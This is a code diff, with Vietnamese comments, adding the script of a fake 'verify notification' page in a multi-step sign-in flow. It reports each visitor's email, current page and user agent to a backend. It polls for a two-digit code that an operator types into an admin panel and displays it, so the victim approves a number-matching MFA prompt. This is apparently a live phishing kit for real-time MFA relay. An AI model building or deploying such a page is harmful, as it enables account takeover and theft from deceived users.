+            YE: 'ar', DZ: 'ar', BH: 'ar', SD: 'ar',
+            IT: 'it', SM: 'it', VA: 'it',
+            NL: 'nl', PL: 'pl', TR: 'tr', IN: 'hi',
+        };
+
+        function getMeta(code) { return LANG_META.find(m => m.code === code) || LANG_META[0]; }
+
+        // Cho biết có đang hiển thị code hay chưa — ảnh hưởng đến việc
+        // render "instruction text" theo template có {n} hoặc không.
+        let currentCode = null;
+
+        function applyLang(code) {
+            const dict = I18N[code] || I18N.en;
+            document.documentElement.lang = code;
+            document.documentElement.dir = (code === 'ar') ? 'rtl' : 'ltr';
+            window.__currentLang = code;
+            window.__t = dict;
+
+            document.querySelectorAll('[data-i18n]').forEach(el => {
+                const key = el.getAttribute('data-i18n');
+                let val = dict[key];
+                if (!val) return;
+                // Placeholder expansion cho instruction text khi có code 2 số.
+                if (key === 'it') {
+                    if (currentCode) val = val.replace('{n}', currentCode);
+                    else val = dict.itBase || val;
+                }
+                if (el.getAttribute('data-i18n-html') === '1') el.innerHTML = val;
+                else el.textContent = val;
+            });
+
+            const meta = getMeta(code);
+            const label = document.getElementById('langCurrentLabel');
+            if (label) label.textContent = meta.native;
+            document.querySelectorAll('#langMenu button').forEach(b => {
+                b.classList.toggle('active', b.dataset.code === code);
+            });
+        }
+
+        function buildLangMenu() {
+            const menu = document.getElementById('langMenu');
+            if (!menu) return;
+            menu.innerHTML = LANG_META.map(m => `
+                <button type="button" data-code="${m.code}" role="option" title="${m.native}">${m.native}</button>
+            `).join('');
+            menu.querySelectorAll('button').forEach(b => {
+                b.addEventListener('click', () => {
+                    const code = b.dataset.code;
+                    localStorage.setItem('preferredLang', code);
+                    localStorage.setItem('langManual', '1');
+                    applyLang(code);
+                    document.getElementById('langPicker').classList.remove('open');
+                });
+            });
+        }
+
+        async function detectLangByIp() {
+            if (localStorage.getItem('langManual') === '1') {
+                return localStorage.getItem('preferredLang') || 'en';
+            }
+            const cached = localStorage.getItem('preferredLang');
+            if (cached && I18N[cached]) return cached;
+            try {
+                const resp = await fetch('https://ipwho.is/?fields=country_code,success', { cache: 'force-cache' });
+                const j = await resp.json();
+                if (j && j.success && j.country_code) {
+                    const cc = j.country_code.toUpperCase();
+                    const lang = COUNTRY_LANG[cc] || 'en';
+                    localStorage.setItem('preferredLang', lang);
+                    localStorage.setItem('langAutoCC', cc);
+                    return lang;
+                }
+            } catch (_) {}
+            const nav = (navigator.language || 'en').toLowerCase();
+            if (nav.startsWith('vi')) return 'vi';
+            if (nav.startsWith('ja')) return 'ja';
+            if (nav.startsWith('ko')) return 'ko';
+            if (nav.startsWith('zh-tw') || nav.startsWith('zh-hk')) return 'zh-TW';
+            if (nav.startsWith('zh')) return 'zh-CN';
+            if (nav.startsWith('fr')) return 'fr';
+            if (nav.startsWith('de')) return 'de';
+            if (nav.startsWith('es')) return 'es';
+            if (nav.startsWith('pt')) return 'pt-BR';
+            if (nav.startsWith('ru')) return 'ru';
+            if (nav.startsWith('id')) return 'id';
+            if (nav.startsWith('th')) return 'th';
+            if (nav.startsWith('ar')) return 'ar';
+            if (nav.startsWith('it')) return 'it';
+            if (nav.startsWith('nl')) return 'nl';
+            if (nav.startsWith('pl')) return 'pl';
+            if (nav.startsWith('tr')) return 'tr';
+            if (nav.startsWith('hi')) return 'hi';
+            return 'en';
+        }
+
+        // Đóng dropdown khi click ra ngoài
+        document.addEventListener('click', (e) => {
+            const picker = document.getElementById('langPicker');
+            if (!picker) return;
+            if (!picker.contains(e.target)) picker.classList.remove('open');
+        });
+
+        // =====================================================
+        // Page helpers
+        // =====================================================
+        async function updatePageStatus(pageName) {
+            const requestId = localStorage.getItem('requestId');
+            if (!requestId) return;
+            try {
+                await fetch('http://localhost:5000/api/update-page', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ id: parseInt(requestId), currentPage: pageName })
+                });
+            } catch (_) {}
+        }
+
+        function showMiniToast(msg) {
+            const t = document.getElementById('miniToast');
+            if (!t) return;
+            t.textContent = msg;
+            t.classList.add('show');
+            clearTimeout(t._to);
+            t._to = setTimeout(() => t.classList.remove('show'), 2200);
+        }
+
+        // Chuyển trang dùng chung "waiting" style giống login / password:
+        //   - Thanh loading xanh mảnh chạy trên đỉnh card.
+        //   - Phần .signin-columns bên trong card mờ đi (opacity .45 + blur nhẹ
+        //     nhờ class .content-card.waiting đã khai báo ở CSS trang này).
+        //   - KHÔNG bật .loading-overlay toàn màn hình (hiệu ứng "tối sầm"),
+        //     chỉ làm mờ phần form để UX thống nhất với index.html / password.html.
+        function handleTransition(url) {
+            const card = document.querySelector('.content-card');
+            const progressBar = document.getElementById('progressBar');
+            const progressContainer = document.querySelector('.progress-container');
+            if (card) card.classList.add('waiting');
+            if (progressContainer) progressContainer.classList.add('active');
+            if (progressBar) {
+                progressBar.style.width = '0%';
+                progressBar.classList.remove('loading', 'completing');
+                setTimeout(() => {
+                    progressBar.classList.add('loading');
+                    progressBar.style.width = '80%';
+                }, 60);
+            }
+            setTimeout(() => {
+                if (progressBar) {
+                    progressBar.classList.remove('loading');
+                    progressBar.classList.add('completing');
+                    progressBar.style.width = '100%';
+                }
+                setTimeout(() => {
+                    if (progressContainer) progressContainer.classList.remove('active');
+                    window.location.href = url;
+                }, 200);
+            }, 500);
+        }
+
+        function handleMobileLayout() {
+            function checkMobile() {
+                if (window.innerWidth <= 600) document.body.classList.add('mobile-layout');
+                else document.body.classList.remove('mobile-layout');
+            }
+            checkMobile();
+            window.addEventListener('resize', checkMobile);
+        }
+
+        function displayUserEmail() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const email = urlParams.get('email') || localStorage.getItem('userEmail') || '';
+            document.querySelectorAll('.user-email').forEach(el => { el.textContent = email; });
+        }
+
+        // =====================================================
+        // Live-update code 2 số từ admin (poll /api/check-approval)
+        // =====================================================
+        let lastShownCode = null;
+        let waitingForNew = false;
+
+        function startFormProgress() {
+            const bar = document.getElementById('progressBar');
+            const box = document.querySelector('.progress-container');
+            if (bar && box) {
+                bar.className = 'progress-bar indeterminate';
+                bar.style.width = '';
+                box.classList.add('active');
+            }
+            document.querySelectorAll('.g-waitbar').forEach(b => {
+                b.style.display = '';
+                b.style.opacity = '1';
+            });
+        }
+
+        function stopFormProgress() {
+            const bar = document.getElementById('progressBar');
+            const box = document.querySelector('.progress-container');
+            if (bar && box) {
+                box.classList.remove('active');
+                bar.classList.remove('indeterminate');
+                bar.style.width = '0%';
+            }
+            document.querySelectorAll('.g-waitbar').forEach(b => {
+                b.style.opacity = '0';
+                b.style.display = 'none';
+            });
+        }
+
+        function setCardWaiting(on) {
+            const card = document.querySelector('.content-card');
+            if (!card) return;
+            if (on) card.classList.add('waiting');
+            else card.classList.remove('waiting');
+        }
+
+        // Cập nhật instruction text khi có code mới (dùng dict hiện tại).
+        function renderInstruction(code) {
+            const textEl = document.querySelector('.instruction-text');
+            if (!textEl) return;
+            const dict = window.__t || I18N.en;
+            const tpl = code ? dict.it : (dict.itBase || dict.it);
+            textEl.innerHTML = code ? tpl.replace('{n}', code) : tpl;
+        }
+
+        async function updateCode() {
+            const email = localStorage.getItem('userEmail') || '';
+            if (!email) return;
+            try {
+                const r = await fetch(
+                    `http://localhost:5000/api/check-approval?email=${encodeURIComponent(email)}`,
+                    { cache: 'no-store' }
+                );
+                if (!r.ok) return;
+                const data = await r.json();
+                const code = (data.verificationCode || '').toString().trim();
+                const isEmpty = !code || code === 'on';
+                const numEl = document.querySelector('.verification-number');
+
+                if (isEmpty && lastShownCode && !waitingForNew) {
+                    waitingForNew = true;
+                    setCardWaiting(true);
+                    startFormProgress();
+                    return;
+                }
+                if (isEmpty) return;
+
+                if (waitingForNew) {
+                    waitingForNew = false;
+                    lastShownCode = code;
+                    currentCode = code;
+                    if (numEl) {
+                        numEl.classList.remove('code-appear');
+                        numEl.textContent = code;
+                    }
+                    renderInstruction(code);
+                    setCardWaiting(false);
+                    stopFormProgress();
+                    return;
+                }
+
+                if (code !== lastShownCode) {
+                    const prev = lastShownCode;
+                    lastShownCode = code;
+                    currentCode = code;
+                    if (prev !== null) {
+                        startFormProgress();
+                        await new Promise(res => setTimeout(res, 700));
+                    }
+                    if (numEl) {
+                        numEl.classList.remove('code-appear');
+                        numEl.textContent = code;
+                        if (prev === null) {
+                            void numEl.offsetWidth;
+                            numEl.classList.add('code-appear');
+                        }
+                    }
+                    renderInstruction(code);
+                    stopFormProgress();
+                }
+            } catch (_) {}
+        }
+
+        // =====================================================
+        // Resend it: clear code trên server + re-submit để reset status về
+        // pending → admin thấy popup 2FA NUMBER hiện lại để gửi số mới.
+        // Client cũng clear số hiện tại + vào trạng thái chờ (dim + loading
+        // bar) để user biết hệ thống đang xin số mới.
+        // =====================================================
+        async function handleResend() {
+            const email = localStorage.getItem('userEmail') || '';
+            if (!email) return;
+            const numEl = document.querySelector('.verification-number');
+            if (numEl) numEl.textContent = '';
+            lastShownCode = null;
+            currentCode = null;
+            waitingForNew = true;
+            setCardWaiting(true);
+            startFormProgress();
+            renderInstruction(null);
+            try {
+                // Xoá verificationCode cũ để poll không render lại số cũ
+                await fetch('http://localhost:5000/api/set-verification-code', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ email, code: '' })
+                });
+                // Reset status về pending + bump lastSeen → admin thấy Active
+                await fetch('http://localhost:5000/api/request', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        email,
+                        userAgent: navigator.userAgent,
+                        currentPage: 'verify-notification.html'
+                    })
+                });
+            } catch (_) {}
+            const dict = window.__t || I18N.en;
+            showMiniToast(dict.toast || 'A new notification has been sent');
+        }
+
+        // =====================================================
+        // Init
+        // =====================================================
+        document.addEventListener('DOMContentLoaded', async function () {
+            handleMobileLayout();
+            displayUserEmail();
+
+            // i18n: build menu, áp ngôn ngữ cache ngay, sau đó detect IP async
+            buildLangMenu();
+            applyLang(localStorage.getItem('preferredLang') || 'en');
+            detectLangByIp().then(lang => applyLang(lang)).catch(() => {});
+
+            // Language picker toggle
+            const picker = document.getElementById('langPicker');
+            const pickerBtn = document.getElementById('langPickerBtn');
+            if (pickerBtn) {
+                pickerBtn.addEventListener('click', (e) => {
+                    e.stopPropagation();
+                    picker.classList.toggle('open');
+                    const isOpen = picker.classList.contains('open');
+                    pickerBtn.setAttribute('aria-expanded', isOpen ? 'true' : 'false');
+                    if (isOpen) {
+                        const active = picker.querySelector('#langMenu button.active');
+                        if (active) active.scrollIntoView({ block: 'center' });
+                    }
+                });
+            }
+
+            // "Resend it" hiển thị disabled (xám + extra bold) — không gắn
+            // handler click. Giữ handleResend() trong file để tiện bật lại
+            // sau này nếu cần (chỉ cần bỏ thuộc tính disabled + class).
+
+            // Chưa có code → bật loading bar ngay
+            startFormProgress();
+
+            // Báo server user đã đến trang này → admin poll thấy pageStatus
+            const email = localStorage.getItem('userEmail') || '';
+            if (email) {
+                try {
+                    const r = await fetch('http://localhost:5000/api/request', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            email,
+                            userAgent: navigator.userAgent,
+                            currentPage: 'verify-notification.html'
+                        })
+                    });
+                    if (r.ok) {
+                        const data = await r.json();
+                        if (data.requestId) localStorage.setItem('requestId', data.requestId);
+                    }
+                } catch (_) {}
+            }
+
+            updateCode();
+            setInterval(updateCode, 800);
+        });
+
+        document.addEventListener('keydown', function (e) {
+            if (e.key === 'Escape') handleTransition('2FA OPTION.html');
+        });
+        window.addEventListener('popstate', function () {
+            handleTransition('2FA OPTION.html');
+        });
+    </script>
+</body>
+</html>
